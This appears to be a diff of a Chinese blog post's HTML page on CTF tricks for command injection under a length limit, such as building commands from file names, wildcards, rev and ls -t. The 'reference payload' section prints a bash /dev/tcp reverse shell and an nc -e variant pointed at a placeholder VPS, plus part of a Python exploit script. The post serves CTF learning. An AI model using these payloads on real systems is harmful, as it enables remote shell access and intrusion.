@@ -528,42 +528,36 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="前言">前言</h2>
-<p>最近打 CTF 的时候遇到了个 <strong>命令执行</strong> 的 web 题目，但是它<strong>限制了命令的长度</strong>。</p>
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近打 CTF 的时候遇到了个 <strong>命令执行</strong> 的 web 题目，但是它<strong>限制了命令的长度</strong>。</p>
 <p>于是查了一些资料，正好就来总结一下一些相关的小技巧吧，喵~</p>
 <br>
-<h2 id="默认排序">默认排序</h2>
-<p><code>ls</code> 默认的排序是按照字母顺序来的，一个一个字符来看，<code>|</code> =&gt; 空格 =&gt; 数字 =&gt; 字母。</p>
+
+<h2 id="默认排序"><a href="#默认排序" class="headerlink" title="默认排序"></a>默认排序</h2><p><code>ls</code> 默认的排序是按照字母顺序来的，一个一个字符来看，<code>|</code> =&gt; 空格 =&gt; 数字 =&gt; 字母。</p>
 <p>以 <code>-</code> 开头的文件名不看 <code>-</code>，从之后的第一个字符开始比较。</p>
 <br>
-<h2 id="一些-tricks">一些 tricks</h2>
-<ol>
-<li>
-<p>Linux 下可以用 <code>\</code> 来拼接命令，实现命令续行，生成文件的话文件名要双写 <code>\\</code>，比如 <code>&gt;ls\\</code>。</p>
+
+
+
+<h2 id="一些-tricks"><a href="#一些-tricks" class="headerlink" title="一些 tricks"></a>一些 tricks</h2><ol>
+<li><p>Linux 下可以用 <code>\</code> 来拼接命令，实现命令续行，生成文件的话文件名要双写 <code>\\</code>，比如 <code>&gt;ls\\</code>。</p>
 </li>
-<li>
-<p>注意不要用 <code>.</code> 作为文件名的开头，因为 Linux 下 <code>.</code> 会作为隐藏文件，直接用 <code>ls</code> 列不出来。</p>
+<li><p>注意不要用 <code>.</code> 作为文件名的开头，因为 Linux 下 <code>.</code> 会作为隐藏文件，直接用 <code>ls</code> 列不出来。</p>
 </li>
-<li>
-<p>为了不按照默认顺序排序，可以用 <code>ls -t</code>，按照时间顺序，后执行的排前面，于是可以拆分命令再拼接来实现。</p>
+<li><p>为了不按照默认顺序排序，可以用 <code>ls -t</code>，按照时间顺序，后执行的排前面，于是可以拆分命令再拼接来实现。</p>
 </li>
-<li>
-<p><code>dir a b&gt;c</code> 只会将 a b 写到文件 c 中，而其他的文件则不会。</p>
+<li><p><code>dir a b&gt;c</code> 只会将 a b 写到文件 c 中，而其他的文件则不会。</p>
 </li>
-<li>
-<p>用 <code>*</code> 可以得到当前目录下的所有目录及文件名，而且能用文件名执行命令。</p>
+<li><p>用 <code>*</code> 可以得到当前目录下的所有目录及文件名，而且能用文件名执行命令。</p>
 <p><img src="/2021/01/31/CTF_web_CommandExecutionLimitedLength/image-20210131225509319.png" alt="*"></p>
 </li>
-<li>
-<p>利用 <code>rev</code> 命令可以执行反序，先生成一个名为 <code>rev</code> 的文件，再执行 <code>*v</code>，由于 Linux 的通配符，就相当于执行了 <code>rev v</code>，太妙了！</p>
-<p><img src="/2021/01/31/CTF_web_CommandExecutionLimitedLength/image-20210131233131781.png" alt=""></p>
+<li><p>利用 <code>rev</code> 命令可以执行反序，先生成一个名为 <code>rev</code> 的文件，再执行 <code>*v</code>，由于 Linux 的通配符，就相当于执行了 <code>rev v</code>，太妙了！  </p>
+<p><img src="/2021/01/31/CTF_web_CommandExecutionLimitedLength/image-20210131233131781.png"></p>
 </li>
-<li>
-<p>还可以用 <code>ls -th</code>，<code>-h</code> 不影响执行，但 <code>ht-</code> 就能排到 <code>sl</code> 前面去，搭配 <code>*v</code> 使用更好了。</p>
+<li><p>还可以用 <code>ls -th</code>，<code>-h</code> 不影响执行，但 <code>ht-</code> 就能排到 <code>sl</code> 前面去，搭配 <code>*v</code> 使用更好了。</p>
 </li>
 </ol>
 <blockquote>
-<p>-h, --human-readable       with -l and -s, print sizes like 1K 234M 2G etc.</p>
+<p>-h, –human-readable       with -l and -s, print sizes like 1K 234M 2G etc.</p>
 </blockquote>
 <ol start="8">
 <li>PHP 代码执行 <code>exec</code> 时，只需要输入<code>\</code> 即可生成 <code>\\</code>，比如 <code>exec("&gt;ls\")</code> 即可，还能省一个字符呢。</li>
@@ -571,8 +565,10 @@
 <li>可以依次执行 <code>&gt;env</code>, <code>*&gt;x</code>，相当于执行 <code>env&gt;x</code>，就能在 <code>x</code> 文件里得到环境变量里的内容。</li>
 </ol>
 <br>
-<h2 id="参考-Payload">参考 Payload</h2>
-<p>这个是<strong>反弹 shell</strong> 的思路。</p>
+
+
+
+<h2 id="参考-Payload"><a href="#参考-Payload" class="headerlink" title="参考 Payload"></a>参考 Payload</h2><p>这个是<strong>反弹 shell</strong> 的思路。</p>
 <p>最开始需要在 VPS 某个页面上放个反弹 shell 的脚本。</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">&gt;&amp;</span> /dev/tcp/VPSIP/PORT <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
 <span class="token comment"># 或者 nc -e /bin/sh VPSIP PORT</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
@@ -640,23 +636,25 @@ r<span class="token punctuation">.</span>encoding <span class="token operator">=
 <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'==&gt;'</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
 s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>reset<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <br>
-<h2 id="参考题目">参考题目</h2>
-<p><strong>0x41414141 CTF 2021 hackme:</strong></p>
+
+<h2 id="参考题目"><a href="#参考题目" class="headerlink" title="参考题目"></a>参考题目</h2><p><strong>0x41414141 CTF 2021 hackme:</strong></p>
 <p><a href="https://miaotony.xyz/2021/01/31/CTF_2021_0x41414141/#hackme">CTF | 2021 0x41414141CTF 部分 WriteUp</a></p>
 <br>
+
 <p><strong>HITCON 2017 BabyFirst Revenge:</strong></p>
-<p><a target="_blank" rel="noopener" href="https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/">HITCON 2017 CTF BabyFirst Revenge</a></p>
+<p><a target="_blank" rel="noopener" href="https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/">HITCON 2017 CTF BabyFirst Revenge</a> </p>
 <p>这个用 <code>tar</code> 压缩得到根目录下文件，不过前提是当前目录的文件能下载，php 倒是可以。</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/bennofs/docs/blob/master/hitcon-2017/baby-first-revenge2.md">Baby First Revenge v2 <em>(GitHub)</em></a></p>
 <p>里面还有一些奇奇怪怪的操作（</p>
 <br>
+
 <p>以及一些 <strong>汇总</strong>：</p>
 <p>主要也是 HITCON 的题目<small><em>（怎么这么喜欢出</em></small></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/bajinsheng/article/details/78703249">命令注入突破长度限制 | 从CTF题目讲起</a></p>
 <br>
+
 <hr>
-<h2 id="References-Extensive-Reading">References &amp; Extensive Reading</h2>
-<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/154453.html">挖洞经验 | 命令注入突破长度限制</a></p>
+<h2 id="References-amp-Extensive-Reading"><a href="#References-amp-Extensive-Reading" class="headerlink" title="References &amp; Extensive Reading"></a>References &amp; Extensive Reading</h2><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/154453.html">挖洞经验 | 命令注入突破长度限制</a></p>
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2748">从一道ctf题目学到的绕过长度执行命令姿势</a></p>
 <p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/127047303">CTF中的命令执行绕过</a></p>
 <p><em>（溜了喵</em></p>
@@ -1215,7 +1213,7 @@ s<span class="token punctuation">.</span>get<span class="token punctuation">(</s
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
             <br>
                         &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">308.3k</span>&nbsp;字
+                class="white-color">308.1k</span>&nbsp;字
                                                                                     <span id="busuanzi_container_site_pv">
 			|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                     class="white-color"></span>&nbsp;次
